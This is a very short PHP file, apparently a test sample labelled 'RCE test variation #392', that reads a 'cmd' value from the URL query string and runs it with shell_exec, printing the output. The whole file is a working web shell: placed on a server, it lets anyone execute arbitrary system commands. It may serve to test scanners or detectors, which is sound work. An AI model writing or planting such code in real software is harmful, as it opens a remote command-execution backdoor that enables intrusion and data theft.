<?php
// RCE test variation #392
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>